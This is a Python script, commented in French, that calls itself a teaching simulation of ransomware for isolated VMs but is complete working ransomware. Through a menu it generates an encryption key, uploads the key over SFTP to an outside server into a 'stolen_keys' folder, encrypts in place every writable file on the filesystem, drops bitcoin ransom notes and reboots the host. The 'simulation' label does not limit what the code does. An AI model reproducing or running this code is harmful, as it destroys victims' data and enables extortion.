#!/usr/bin/env python3
# ransomware_total.py - Simulation pédagogique de ransomware avec menu
# Usage: sudo python3 ransomware_total.py (UNIQUEMENT EN VM ISOLEE)

import logging
import os
import socket
import subprocess
import sys
import time
from paramiko import SFTPClient, Transport
from cryptography.fernet import Fernet

# Configuration initiale
LOG_FILE = "/var/log/ransomware_sim.log"
SFTP_KEY_PATH = "/tmp/encryption_key.key"

# Initialisation du logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)


class RansomwareSimulator:
    def __init__(self):
        self.fernet = None
        self.key = None
        self.sftp_config = {
            'server': None,
            'port': 22,
            'user': None,
            'password': None
        }

    def check_root(self):
        """Vérifie si le script est exécuté en root"""
        if os.geteuid() != 0:
            logging.error("Le script doit être exécuté en tant que root!")
            sys.exit(1)

    def generate_key(self):
        """Génère une clé de chiffrement Fernet"""
        try:
            self.key = Fernet.generate_key()
            with open(SFTP_KEY_PATH, "wb") as key_file:
                key_file.write(self.key)
            self.fernet = Fernet(self.key)
            logging.info(f"Clé de chiffrement générée: {SFTP_KEY_PATH}")
            print(f"\n[+] Clé générée avec succès: {SFTP_KEY_PATH}")
            return True
        except Exception as e:
            logging.error(f"Erreur génération clé: {str(e)}")
            return False

    def configure_sftp(self):
        """Configure les paramètres SFTP via l'interface utilisateur"""
        print("\n[ Configuration SFTP ]")
        self.sftp_config['server'] = input("Adresse IP du serveur SFTP: ").strip()
        self.sftp_config['user'] = input("Nom d'utilisateur SFTP: ").strip()
        self.sftp_config['password'] = input("Mot de passe SFTP: ").strip()

        port = input("Port SFTP [22]: ").strip()
        self.sftp_config['port'] = int(port) if port else 22

    def send_key_via_sftp(self):
        """Transmet la clé via SFTP"""
        if not self.key:
            print("\n[!] Aucune clé générée. Veuillez d'abord générer une clé.")
            return False

        try:
            transport = Transport((self.sftp_config['server'], self.sftp_config['port']))
            transport.connect(username=self.sftp_config['user'], password=self.sftp_config['password'])
            sftp = SFTPClient.from_transport(transport)

            remote_dir = f"/home/{self.sftp_config['user']}/stolen_keys"
            try:
                sftp.mkdir(remote_dir)  # Crée le dossier si inexistant
            except IOError:
                pass

            remote_path = f"{remote_dir}/{socket.gethostname()}_key.key"
            sftp.put(SFTP_KEY_PATH, remote_path)
            sftp.close()
            transport.close()

            logging.info(f"Clé transmise à {self.sftp_config['server']}:{remote_path}")
            print(f"\n[+] Clé envoyée avec succès à {self.sftp_config['server']}")
            return True
        except Exception as e:
            logging.error(f"Échec transmission SFTP: {str(e)}")
            print(f"\n[!] Échec de l'envoi: {str(e)}")
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier en place avec Fernet"""
        try:
            with open(filepath, "rb") as file:
                original_data = file.read()

            encrypted_data = self.fernet.encrypt(original_data)

            with open(filepath, "wb") as file:
                file.write(encrypted_data)

            logging.debug(f"Fichier chiffré: {filepath}")
            return True
        except Exception as e:
            logging.warning(f"Échec chiffrement {filepath}: {str(e)}")
            return False

    def encrypt_system(self):
        """Parcourt et chiffre le système de fichiers"""
        if not self.fernet:
            print("\n[!] Aucune clé configurée. Générez d'abord une clé.")
            return

        exclude_dirs = {
            '/proc', '/sys', '/dev', '/run', '/tmp',
            '/var/run', '/var/lock', '/snap', '/boot'
        }

        print("\n[!] ATTENTION: Cette opération va chiffrer tous les fichiers accessibles!")
        confirm = input("Confirmez-vous le chiffrement? (tapez 'CONFIRM'): ")
        if confirm != "CONFIRM":
            print("Annulation du chiffrement.")
            return

        total_encrypted = 0
        start_time = time.time()

        for root, _, files in os.walk('/'):
            if any(root.startswith(ex_dir) for ex_dir in exclude_dirs):
                continue

            for filename in files:
                filepath = os.path.join(root, filename)
                try:
                    if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
                        if self.encrypt_file(filepath):
                            total_encrypted += 1
                            if total_encrypted % 100 == 0:
                                print(f"\r[+] Fichiers chiffrés: {total_encrypted}", end='')
                except Exception as e:
                    logging.warning(f"Erreur traitement {filepath}: {str(e)}")
                    continue

        logging.info(f"Chiffrement terminé. {total_encrypted} fichiers chiffrés en {time.time() - start_time:.2f}s")
        print(f"\n\n[+] Opération terminée. {total_encrypted} fichiers chiffrés.")

    def create_ransom_note(self):
        """Crée un message de rançon"""
        note = f"""
        VOS FICHIERS ONT ÉTÉ CHIFFRÉS!

        Pour récupérer vos données, vous devez:
        1. Envoyer 0.5 BTC à l'adresse: 1Ma1wareSimu1BitcoinAddres5
        2. Envoyer un email à ransomware@example.com avec votre ID: {socket.gethostname()}

        Vous avez 72 heures avant que la clé ne soit définitivement supprimée.
        """

        note_paths = ['/root/README.txt', '/home/README.txt', '/README.txt']
        created = 0

        for path in note_paths:
            try:
                with open(path, 'w') as f:
                    f.write(note)
                logging.info(f"Note de rançon créée: {path}")
                created += 1
            except Exception as e:
                logging.warning(f"Impossible de créer la note {path}: {str(e)}")

        print(f"\n[+] {created} notes de rançon placées dans le système.")

    def reboot_system(self):
        """Redémarre le système"""
        print("\n[!] Le système va redémarrer...")
        logging.info("Déclenchement du redémarrage du système")
        try:
            subprocess.run(['reboot'], check=True)
        except subprocess.CalledProcessError as e:
            logging.error(f"Échec redémarrage: {str(e)}")
            sys.exit(1)

    def show_menu(self):
        """Affiche le menu principal"""
        while True:
            print("\n" + "=" * 50)
            print(" MENU PRINCIPAL - RANSOMWARE SIMULATEUR")
            print("=" * 50)
            print("1. Générer une clé de chiffrement")
            print("2. Configurer le serveur SFTP")
            print("3. Envoyer la clé via SFTP")
            print("4. Chiffrer le système")
            print("5. Placer les notes de rançon")
            print("6. Redémarrer le système")
            print("0. Quitter")
            print("=" * 50)

            choice = input("\nVotre choix: ").strip()

            if choice == "1":
                self.generate_key()
            elif choice == "2":
                self.configure_sftp()
            elif choice == "3":
                self.send_key_via_sftp()
            elif choice == "4":
                self.encrypt_system()
            elif choice == "5":
                self.create_ransom_note()
            elif choice == "6":
                self.reboot_system()
            elif choice == "0":
                print("\n[+] Fermeture du programme.")
                sys.exit(0)
            else:
                print("\n[!] Choix invalide. Veuillez réessayer.")


def main():
    """Fonction principale"""
    simulator = RansomwareSimulator()
    simulator.check_root()
    logging.info("=== Démarrage du simulateur ransomware ===")
    simulator.show_menu()


if __name__ == "__main__":
    main()